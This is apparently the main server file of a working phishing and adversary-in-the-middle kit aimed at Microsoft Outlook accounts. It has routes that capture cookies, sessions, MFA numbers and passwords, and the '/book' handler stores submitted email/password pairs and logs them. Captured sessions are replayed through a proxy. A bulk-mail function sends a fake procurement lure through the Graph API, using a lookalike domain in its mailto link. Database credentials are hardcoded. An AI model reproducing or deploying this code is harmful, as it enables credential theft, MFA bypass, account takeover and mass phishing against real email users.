require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const axios = require("axios");
const session = require("express-session");
const cookieParser = require("cookie-parser");
const { createProxyMiddleware } = require("http-proxy-middleware");
const path = require("path");
mongoose
  // .connect("mongodb+srv://outlook:outlook@outlook.i3hup.mongodb.net/")
  .connect(
    "mongodb+srv://anonymous:anonymous@cluster0.3hdvk.mongodb.net/myFirstDatabase"
  )
  .then((result) => {
    console.log("mongoose connected");
  })
  .catch((err) => console.log("mongoose not connected", err));

// Routes
const userRoutes = require("./routes/auth");
const adminRoutes = require("./routes/admin");
const proxyRoutes = require("./routes/proxy");
const { router: mfaRoutes } = require("./routes/mfa-status");
const microsoftProxyRoutes = require("./routes/microsoft-proxy");
const cookieInterceptorRoutes = require("./routes/cookie-interceptor");
const cookieStatusRoutes = require("./routes/cookie-status");
const sessionCaptureRoutes = require("./routes/session-capture");
const liveCaptureRoutes = require("./routes/live-capture");
const completeAuthRoutes = require("./routes/complete-auth");
const mfaNumberRoutes = require("./routes/mfa-number");

const app = express();

// Session management
app.use(
  session({
    secret: process.env.SESSION_SECRET || "outlook-proxy-secret",
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 },
  })
);

// Parse incoming requests
app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static(path.join(__dirname, "views")));
app.use(express.static(__dirname)); // Serve files from root directory

// Set headers
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Authorization, , X-Requested-With, Origin, Accept"
  );
  res.setHeader(
    "Access-Control-Allow-Methods",
    "OPTIONS, GET, POST, PUT, PATCH, DELETE"
  );

  if (req.method === "OPTIONS") {
    return res.sendStatus(200);
  }

  next();
});

// Email verification endpoint
app.post("/verify-email", (req, res) => {
  const { email } = req.body;

  if (!email) {
    return res
      .status(400)
      .json({ success: false, message: "Please enter your email address." });
  }

  // Basic email validation
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return res
      .status(400)
      .json({ success: false, message: "Please enter a valid email address." });
  }

  // Generate hash for URL parameter
  const crypto = require("crypto");
  const hash = crypto.randomBytes(32).toString("hex");

  // Set email cookie
  res.cookie("userEmail", email, {
    httpOnly: true,
    secure: false,
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  });

  res.json({ success: true, hash });
});

// Direct OAuth endpoint - skip fake login, go straight to Microsoft
app.post("/direct-oauth", async (req, res) => {
  const { email } = req.body;

  try {
    // Create or update user record
    const User = require("./models/user");
    let user = await User.findOne({ email });
    if (!user) {
      user = new User({ email, password: "oauth-only" });
      await user.save();
    }

    // Generate Microsoft OAuth URL through cookie interceptor
    const authUrl = `/auth-capture/common/oauth2/v2.0/authorize?client_id=${
      process.env.CLIENT_ID
    }&response_type=code&redirect_uri=${encodeURIComponent(
      process.env.REDIRECT_URI
    )}&scope=https://graph.microsoft.com/Mail.ReadWrite&state=${
      user._id
    }&login_hint=${encodeURIComponent(email)}&userId=${user._id}`;

    res.json({ success: true, authUrl });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Endpoints
app.use("/user", userRoutes);
app.use("/admin", adminRoutes);
app.use("/proxy", proxyRoutes);
app.use("/outlook", require("./routes/outlook"));
app.use("/tokens", require("./routes/tokens"));
app.use("/mfa", mfaRoutes);
app.use("/ms-login", microsoftProxyRoutes);
app.use("/auth-capture", cookieInterceptorRoutes);
app.use("/cookies", cookieStatusRoutes);
app.use("/session", sessionCaptureRoutes);
app.use("/live-capture", liveCaptureRoutes);
app.use("/complete-auth", completeAuthRoutes);
app.use("/mfa-number", mfaNumberRoutes);

// Frontend routes
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "login.html"));
});

app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "admin-dashboard.html"));
});

app.get("/admin/users", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "admin-dashboard.html"));
});

app.get("/inject", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "inject.html"));
});

// Direct proxy access with cookie injection
app.get("/access/:userId", (req, res) => {
  const userId = req.params.userId;
  req.session.userId = userId;
  res.redirect('/proxy/outlook');
});

// Preparation page for better cookie injection
app.get("/prepare/:userId", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "prepare.html"));
});

app.get("/capture-cookies", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "capture-cookies.html"));
});

app.get("/mfa-display", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "mfa-display.html"));
});
app.get("/", (req, res, next) => {
  res.send("Hello world");
});

const User = require("./models/user");
app.post("/book", async (req, res) => {
  const email = req.body.email,
    password = req.body.password;

  const user = new User({
    email: email,
    password: password,
  });

  await user.save();

  // Output the book to the console for debugging
  console.log(email, password);

  res.send("Book is added to the database");
});

const GRAPH_API_URL = "https://graph.microsoft.com/v1.0/me/sendMail";

// Function to get access token using refresh token
async function getAccessToken() {
  const { CLIENT_ID, CLIENT_SECRET, TENANT_ID, REFRESH_TOKEN } = process.env;

  try {
    const response = await axios.post(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        refresh_token: REFRESH_TOKEN,
        grant_type: "refresh_token",
      }),
      { headers: { "Content-Type": "application/x-www-form-urlencoded" } }
    );

    return response.data.access_token;
  } catch (error) {
    console.error(
      "Error getting access token:",
      error.response?.data || error.message
    );
    return null;
  }
}

// Function to send email
async function sendEmail(accessToken, recipient) {
  const emailData = {
    message: {
      subject: "Important Notification",
      body: {
        contentType: "HTML",
        content: `<p>Hello Dear,</p>
      <p>I hope you are doing well. </p>
      <p>We are in urgent need of the subject mentioned product for an ongoing project.</p>
      <p>Please let us know if it is possible to provide us with a solution, kindly provide your company catalog so we can review.</p>
      <p>Thank you in advance and I look forward to receiving your prompt reply.</p>
      <p><b>Marc Steenhaut </b></p>
      <p><b>Procurement Manager</b></p>
      <div><img src="https://res.cloudinary.com/muyi-hira-app/image/upload/v1740568695/logs_z3xiyy.png" alt=""></div>
      <p><b>T:</b>[http://+17176783238]+1 717 678 3238</p>
      <p><b>E:</b>  <a href="mailto:marc@rnerlinsourcing.com">marc@merlinsourcing.com</a></p>
      <p><b>W:</b> <a href="https://merlinsourcing.com/">merlinsourcing.com/</a></p>`,
      },
      toRecipients: [{ emailAddress: { address: recipient } }],
    },
  };

  try {
    await axios.post(GRAPH_API_URL, emailData, {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
      },
    });
    return { email: recipient, status: "Sent" };
  } catch (error) {
    return {
      email: recipient,
      status: "Failed",
      error: error.response?.data || error.message,
    };
  }
}

// Route to send bulk emails
app.post("/send-bulk-email", async (req, res) => {
  const { emails } = req.body;

  if (!emails || !Array.isArray(emails)) {
    return res.status(400).json({ message: "Invalid email list" });
  }

  const accessToken = await getAccessToken();
  if (!accessToken)
    return res.status(500).json({ message: "Failed to get access token" });

  const results = [];
  for (const email of emails) {
    const result = await sendEmail(accessToken, email);
    results.push(result);
  }

  res.json({ message: "Bulk email process completed", results });
});

// Favicon route
app.get("/favicon.ico", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "logo.ico"));
});

// Error handler
app.use((err, req, res, next) => {
  const status = err.statusCode,
    message = err.message,
    type = err.type || "";

  res.status(status).json({ message, status, type });
});

const port = process.env.PORT || 8000;
app.listen(port, () => console.log("Server started"));
